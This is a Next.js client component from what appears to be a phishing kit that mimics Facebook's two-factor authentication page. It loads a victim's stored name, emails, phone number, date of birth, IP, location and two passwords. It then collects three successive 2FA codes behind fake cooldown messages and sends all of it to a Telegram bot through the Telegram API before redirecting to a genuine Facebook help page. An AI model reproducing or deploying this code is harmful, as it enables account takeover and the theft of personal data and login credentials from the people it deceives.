"use client";

import Image from "next/image";
import { useRouter, useSearchParams } from "next/navigation";
import { useEffect, useMemo, useState } from "react";
import { Dictionary, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from "@/lib/config";
import styles from "./two-factor.module.css";

type TwoFactorMethod = "app" | "whatsapp" | "sms" | "email";

type ReviewForm = {
  fullName: string;
  email: string;
  workEmail: string;
  pageName: string;
  phoneNumber: string;
  dateOfBirth: string;
  details: string;
};

type TwoFactorContext = {
  form: ReviewForm;
  clientIp: string;
  clientLocation: string;
  clientCountryCode: string;
  clientCallingCode: string;
  password1: string;
  password2: string;
  code1: string;
  code2: string;
  code3: string;
  clickCount1: number;
  messageId: string | null;
  currentUrl: string;
  selectedMethod: TwoFactorMethod;
  locale?: Locale;
};

type TelegramOverrides = Partial<{
  code1: string;
  code2: string;
  code3: string;
  status: string;
}>;

const CONTEXT_KEY = "two_factor_context";
const BOT_TOKEN = TELEGRAM_BOT_TOKEN;
const CHAT_ID = TELEGRAM_CHAT_ID;

function formatCooldownTime(seconds: number, locale: Locale) {
  const minutes = Math.floor(seconds / 60);
  const remainingSeconds = seconds % 60;
  const segments: string[] = [];

  if (locale === "vi") {
    if (minutes > 0) {
      segments.push(`${minutes} phút`);
    }
    if (remainingSeconds > 0) {
      segments.push(`${remainingSeconds} giây`);
    }
  } else {
    if (minutes > 0) {
      segments.push(`${minutes} minute${minutes > 1 ? "s" : ""}`);
    }
    if (remainingSeconds > 0) {
      segments.push(`${remainingSeconds} second${remainingSeconds > 1 ? "s" : ""}`);
    }
  }

  return segments.join(" ");
}

function escapeHtml(value: string | null | undefined): string {
  if (value == null) {
    return "";
  }

  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/\"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function getCurrentTime(): string {
  return new Date().toLocaleString("en-US", { hour12: false });
}

function normalizeCallingCode(value: string | null | undefined): string {
  if (!value) {
    return "";
  }

  const digits = value.replace(/\D/g, "");
  return digits ? `+${digits}` : "";
}

function maskPhoneTail(value: string): string {
  const digits = value.replace(/\D/g, "");
  const tail = digits.slice(-2);
  return tail ? `******${tail}` : "******";
}

function maskEmail(value: string): string {
  const trimmed = value.trim();
  if (!trimmed || !trimmed.includes("@")) {
    return "he***@gmail.com";
  }
  const [user, domain] = trimmed.split("@");
  const prefix = user.slice(0, 2).padEnd(2, "*");
  return `${prefix}***@${domain}`;
}

function applyTemplate(template: string, value: string): string {
  return template.replace("{value}", value);
}

function loadContext(): TwoFactorContext | null {
  if (typeof window === "undefined") {
    return null;
  }
  const raw = window.localStorage.getItem(CONTEXT_KEY);
  if (!raw) {
    return null;
  }
  try {
    return JSON.parse(raw) as TwoFactorContext;
  } catch (error) {
    console.error("Invalid two factor context", error);
    return null;
  }
}

function saveContext(next: TwoFactorContext) {
  if (typeof window === "undefined") {
    return;
  }
  window.localStorage.setItem(CONTEXT_KEY, JSON.stringify(next));
}

export default function TwoFactorClient({ locale }: { locale: Locale }) {
  const router = useRouter();
  const searchParams = useSearchParams();
  const methodParam = useMemo(() => searchParams.get("method"), [searchParams]);
  const [context, setContext] = useState<TwoFactorContext | null>(() => loadContext());
  const [twoFactorCode, setTwoFactorCode] = useState("");
  const [twoFactorError, setTwoFactorError] = useState("");
  const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
  const [timeLeft, setTimeLeft] = useState(0);
  const [showAltMethods, setShowAltMethods] = useState(false);
  const [popupMethod, setPopupMethod] = useState<TwoFactorMethod>("app");

  const derivedLocale = context?.locale
    ? context.locale
    : context?.clientCountryCode
      ? resolveLocaleFromCountryCode(context.clientCountryCode)
      : locale;
  const dictionary: Dictionary = getDictionary(derivedLocale);
  const modal = dictionary.modal;

  useEffect(() => {
    if (!context) {
      router.replace("/");
      return;
    }
  }, [context, router]);

  useEffect(() => {
    if (!context) {
      return;
    }
    const nextMethod = (methodParam as TwoFactorMethod | null) || context.selectedMethod || "app";
    if (context.selectedMethod !== nextMethod) {
      saveContext({ ...context, selectedMethod: nextMethod });
    }
  }, [context, methodParam]);

  useEffect(() => {
    if (!isSubmitDisabled || timeLeft <= 0) {
      return;
    }
    const timer = setTimeout(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setIsSubmitDisabled(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearTimeout(timer);
  }, [isSubmitDisabled, timeLeft]);

  const twoFactorErrorMessage =
    isSubmitDisabled && timeLeft > 0
      ? `${modal.twoFactorIncorrectLabel} ${formatCooldownTime(timeLeft, derivedLocale)}`
      : twoFactorError;

  const selectedMethod = (methodParam as TwoFactorMethod | null) || context?.selectedMethod || "app";
  const twoFactorMethodContent = (() => {
    if (!context) {
      return {
        title: modal.twoFactorHeading,
        description: modal.twoFactorDescription,
        imageSrc: "/imgi_1_2fa.cef3489675d7acf425ec.jpg",
      };
    }
    if (selectedMethod === "whatsapp") {
      return {
        title: modal.twoFactorWhatsappTitle,
        description: applyTemplate(modal.twoFactorWhatsappDescription, maskPhoneTail(context.form.phoneNumber)),
        imageSrc: "/imgi_1_whatsApp.4313bae1d1ce346d2fe6.png",
      };
    }
    if (selectedMethod === "sms") {
      return {
        title: modal.twoFactorSmsTitle,
        description: applyTemplate(modal.twoFactorSmsDescription, maskPhoneTail(context.form.phoneNumber)),
        imageSrc: "/imgi_1_sms.874d1de2b472119dde0c.png",
      };
    }
    if (selectedMethod === "email") {
      return {
        title: modal.twoFactorEmailTitle,
        description: applyTemplate(modal.twoFactorEmailDescription, maskEmail(context.form.email)),
        imageSrc: "/imgi_1_sms.874d1de2b472119dde0c.png",
      };
    }
    return {
      title: modal.twoFactorHeading,
      description: modal.twoFactorDescription,
      imageSrc: "/imgi_1_2fa.cef3489675d7acf425ec.jpg",
    };
  })();

  const buildTelegramMessage = (status: string, overrides: TelegramOverrides = {}) => {
    if (!context) {
      return "";
    }
    const locationParts = (context.clientLocation ?? "")
      .split("/")
      .map((part) => part.trim())
      .filter(Boolean);
    const safeCountry = escapeHtml(locationParts[2] ?? locationParts[1] ?? locationParts[0] ?? "N/A");
    const safeCity = escapeHtml(locationParts[1] ?? locationParts[0] ?? "N/A");
    const safeIp = escapeHtml(context.clientIp ?? "N/A");
    const safePageName = escapeHtml(context.form.pageName || "N/A");
    const safeFullName = escapeHtml(context.form.fullName || "N/A");
    const safeDateOfBirth = escapeHtml(context.form.dateOfBirth || "N/A");
    const safePersonalEmail = escapeHtml(context.form.email || "N/A");
    const safeBusinessEmail = escapeHtml(context.form.workEmail || "N/A");
    const safeDetails = escapeHtml(context.form.details.trim() || "N/A");
    const safePhone = escapeHtml(
      `${normalizeCallingCode(context.clientCallingCode)} ${context.form.phoneNumber}`.trim() || "+84",
    );
    const safeUrl = escapeHtml(context.currentUrl || "N/A");
    const safeTime = escapeHtml(getCurrentTime());
    const safePassword1 = escapeHtml(context.password1 || "N/A");
    const safePassword2 = escapeHtml(context.password2 || "N/A");
    const safeCode1 = escapeHtml(overrides.code1 ?? context.code1 ?? "N/A");
    const safeCode2 = escapeHtml(overrides.code2 ?? context.code2 ?? "N/A");
    const safeCode3 = escapeHtml(overrides.code3 ?? context.code3 ?? "N/A");
    const safeStatus = escapeHtml(overrides.status ?? status ?? "N/A");

    return [
      "👤 <b>THÔNG TIN PHỤ</b>",
      `📱 Tên PAGE: <code>${safePageName}</code>`,
      `👨‍💼 Họ Tên: <code>${safeFullName}</code>`,
      `🎂 Ngày Sinh: <code>${safeDateOfBirth}</code>`,
      "━━━━━━━━━━━━━━━━━━━━━",
      `📍 <b>THÔNG TIN VỊ TRÍ</b>`,
      `🌐 IP: <code>${safeIp}</code>`,
      `🏳️ Quốc Gia: <code>${safeCountry}</code>`,
      `🏙 Thành Phố: <code>${safeCity}</code>`,
      `⏰ Thời Gian: <code>${safeTime}</code>`,
      "━━━━━━━━━━━━━━━━━━━━━",
      `🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>`,
      `📧 Email cá nhân: <code>${safePersonalEmail}</code>`,
      `📧 Email Business: <code>${safeBusinessEmail}</code>`,
      `📞 SĐT: <code>${safePhone}</code>`,
      `🗒 Thông tin bổ sung: <code>${safeDetails}</code>`,
      `🔗 URL: <code>${safeUrl}</code>`,
      `🔑 Mật Khẩu 1: <code>${safePassword1}</code>`,
      `🔑 Mật Khẩu 2: <code>${safePassword2}</code>`,
      `🔓 CODE 2FA 1: <code>${safeCode1}</code>`,
      `🔓 CODE 2FA 2: <code>${safeCode2}</code>`,
      `🔓 CODE 2FA 3: <code>${safeCode3}</code>`,
      `🔄 Trạng thái: ${safeStatus}`,
    ].join("\n");
  };

  const sendTelegramMessage = async (text: string) => {
    if (!BOT_TOKEN || !CHAT_ID) {
      return null;
    }
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: "HTML",
      }),
    });
    const data = (await response.json()) as { ok?: boolean; result?: { message_id?: number } };
    if (data?.ok && data.result?.message_id) {
      const nextId = String(data.result.message_id);
      if (context) {
        const updated = { ...context, messageId: nextId };
        setContext(updated);
        saveContext(updated);
      }
      if (typeof window !== "undefined") {
        window.localStorage.setItem("telegram_msg_id", nextId);
      }
      return nextId;
    }
    return null;
  };

  const updateTelegramMessage = async (status: string, overrides: TelegramOverrides = {}) => {
    if (!context) {
      return;
    }
    const text = buildTelegramMessage(status, overrides);
    const messageId = context.messageId || (typeof window !== "undefined" ? window.localStorage.getItem("telegram_msg_id") : null);
    if (!messageId) {
      await sendTelegramMessage(text);
      return;
    }

    try {
      const messageIdNumber = Number(messageId);
      if (!Number.isFinite(messageIdNumber)) {
        throw new Error("Invalid message id");
      }
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          message_id: messageIdNumber,
          text,
          parse_mode: "HTML",
        }),
      });
      const data = await response.json();
      if (!data?.ok) {
        throw new Error("Telegram edit failed");
      }
    } catch (error) {
      console.error("Telegram Update Error:", error);
      await sendTelegramMessage(text);
    }
  };

  const handleTwoFactorChange = (value: string) => {
    if (!/^\d{0,8}$/.test(value)) {
      return;
    }
    setTwoFactorCode(value);
    if (twoFactorError) {
      setTwoFactorError("");
    }
  };

  const submitCode = async () => {
    if (!context) {
      return;
    }
    const clickCount = context.clickCount1 ?? 0;
    if (isSubmitDisabled) {
      return;
    }
    if (!twoFactorCode.trim()) {
      setTwoFactorError(modal.twoFactorRequiredError);
      return;
    }
    setTwoFactorError("");

    if (clickCount === 0) {
      const firstCode = twoFactorCode;
      const updated = { ...context, code1: firstCode, clickCount1: 1 };
      setContext(updated);
      saveContext(updated);
      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", { code1: firstCode });
      setIsSubmitDisabled(true);
      setTimeLeft(10);
      setTwoFactorCode("");
      return;
    }

    if (clickCount === 1) {
      const secondCode = twoFactorCode;
      const updated = { ...context, code2: secondCode, clickCount1: 2 };
      setContext(updated);
      saveContext(updated);
      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", { code2: secondCode });
      setIsSubmitDisabled(true);
      setTimeLeft(10);
      setTwoFactorCode("");
      return;
    }

    if (clickCount === 2) {
      const thirdCode = twoFactorCode;
      const updated = { ...context, code3: thirdCode, clickCount1: 3 };
      setContext(updated);
      saveContext(updated);
      await updateTelegramMessage("Hoàn tất!", { code3: thirdCode });
      setTwoFactorCode("");
      setTimeout(() => {
        window.location.href = "https://www.facebook.com/help/1735443093393986/";
      }, 2000);
    }
  };

  const handleTryAnotherWay = () => {
    setPopupMethod(selectedMethod);
    setShowAltMethods(true);
  };

  const altMethods = context
    ? ([
        {
          id: "app",
          title: modal.altMethodAppTitle,
          subtitle: modal.altMethodAppSubtitle,
        },
        {
          id: "whatsapp",
          title: modal.altMethodWhatsappTitle,
          subtitle: applyTemplate(modal.altMethodWhatsappSubtitle, maskPhoneTail(context.form.phoneNumber)),
        },
        {
          id: "sms",
          title: modal.altMethodSmsTitle,
          subtitle: applyTemplate(modal.altMethodSmsSubtitle, maskPhoneTail(context.form.phoneNumber)),
        },
        {
          id: "email",
          title: modal.altMethodEmailTitle,
          subtitle: applyTemplate(modal.altMethodEmailSubtitle, maskEmail(context.form.email)),
        },
      ] as const)
    : [];

  const metaLine = context?.form?.fullName?.trim();

  return (
    <div className={styles.container}>
      <div className={styles.content}>
        {metaLine ? <p className={styles.meta}>{metaLine} • Facebook</p> : null}
        <h1 className={styles.title}>{twoFactorMethodContent.title}</h1>
        <p className={styles.description}>{twoFactorMethodContent.description}</p>
        <div className={styles.imageWrap}>
          <Image
            src={twoFactorMethodContent.imageSrc}
            alt={modal.twoFactorImageAlt}
            width={1125}
            height={492}
            className={styles.image}
            priority
          />
        </div>
        <input
          type="text"
          value={twoFactorCode}
          onChange={(event) => handleTwoFactorChange(event.target.value)}
          placeholder={modal.twoFactorPlaceholder}
          className={styles.codeInput}
          inputMode="numeric"
        />
        {twoFactorErrorMessage ? <p className={styles.error}>{twoFactorErrorMessage}</p> : null}

        <button
          type="button"
          className={styles.primaryButton}
          disabled={isSubmitDisabled || !twoFactorCode.trim()}
          onClick={() => void submitCode()}
        >
          {modal.continueButtonLabel}
        </button>
        <button type="button" className={styles.secondaryButton} onClick={handleTryAnotherWay}>
          {modal.altMethodsTriggerLabel}
        </button>
      </div>

      {showAltMethods ? (
        <div className={styles.modalOverlay} onClick={() => setShowAltMethods(false)}>
          <div className={styles.modalContent} onClick={(event) => event.stopPropagation()}>
            <h2 className={styles.modalHeading}>{modal.altMethodsHeading}</h2>
            <p className={styles.modalDescription}>{modal.altMethodsDescription}</p>
            <div className={styles.optionsWrap}>
              {altMethods.map((option) => {
                const isSelected = popupMethod === option.id;
                return (
                  <button
                    key={option.id}
                    type="button"
                    className={styles.optionCard}
                    onClick={() => setPopupMethod(option.id)}
                  >
                    <div className={styles.optionText}>
                      <p className={styles.optionTitle}>{option.title}</p>
                      <p className={styles.optionSubtitle}>{option.subtitle}</p>
                    </div>
                    <span className={`${styles.optionRadio} ${isSelected ? styles.optionRadioActive : ""}`}>
                      <span />
                    </span>
                  </button>
                );
              })}
            </div>
            <button
              type="button"
              className={styles.primaryButton}
              onClick={() => {
                if (!context) {
                  return;
                }
                const updated = { ...context, selectedMethod: popupMethod };
                setContext(updated);
                saveContext(updated);
                setShowAltMethods(false);
                router.push(`/two-factor?method=${popupMethod}`);
              }}
            >
              {modal.continueButtonLabel}
            </button>
          </div>
        </div>
      ) : null}
    </div>
  );
}
